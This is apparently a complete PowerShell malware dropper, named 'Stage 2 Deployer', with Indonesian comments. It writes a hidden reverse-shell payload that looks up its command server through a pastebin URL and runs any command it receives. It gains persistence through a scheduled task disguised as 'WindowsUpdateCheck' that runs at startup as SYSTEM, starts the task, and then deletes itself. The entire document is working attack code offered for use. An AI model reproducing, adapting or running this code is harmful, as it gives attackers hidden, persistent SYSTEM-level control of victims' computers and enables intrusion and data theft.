# d.ps1 - Stage 2 Deployer (C:\Program Files\)
$pf="C:\Program Files\";$c2Payload='$pastebinUrl='https://pastebin.com/raw/F4fUrSeS';$i=30;Add-Type -Name W -Namespace Win32 -M '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr,int);';[Win32.W]::ShowWindow((Get-Process -Id $PID).MainWindowHandle,0);function Test-Conn($s){$c=New-Object Net.Sockets.TcpClient;$tcp=$c.ConnectAsync($s.Split(':')[0],[int]$s.Split(':')[1]);if($tcp.Wait(5e3)){$c.Close();$true}else{$c.Close();$false}};function Get-Srv{$r=iwr $pastebinUrl -UseB -To 10;if($r.StatusCode-eq200 -and $r.Content.Trim()-match'^[a-zA-Z0-9.-]+\:[0-9]+$'){$r.Content.Trim()}};function RevShell($s){$p=$s.Split(':');$c=New-Object Net.Sockets.TcpClient($p[0],$p[1]);$st=$c.GetStream();$b=n byte[]4096;$h=[Text.Encoding]::ASCII;$i="PS|$env:COMPUTERNAME|$((Get-Location).Path)|$(Get-Date)";$ib=$h.gb($i+"`n");$st.Write($ib,0,$ib.L);while($c.Connected-Test-Conn $s){$rb=$st.Read($b,0,$b.L);if($rb-eq0){break};$cmd=$h.gs($b,0,$rb).Trim();if($cmd-eq'exit'){break};try{$o=iex $cmd 2>&1}catch{$o="Error: $($_.Ex.Message)`n"};$ob=$h.gb($o);$st.Write($ob,0,$ob.L);$st.Flush()};if($c){$c.Close()}};while(1){$srv=Get-Srv;if($srv){RevShell $srv};sl $i}';$task="WindowsUpdateCheck"

# 1. Buat System.ps1 (Main C2 Payload)
$c2Payload|sc "$pf\System.ps1" -Force -Enc ASCII

# 2. Deploy schtasks SYSTEM hidden
schtasks /create /tn $task /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$pf\System.ps1`"" /sc onstart /ru SYSTEM /rl HIGHEST /f

# 3. Run immediately
schtasks /run /tn $task

# 4. Self-destruct
ri "$pf\d.ps1" -Force -ErrorAction SilentlyContinue;exit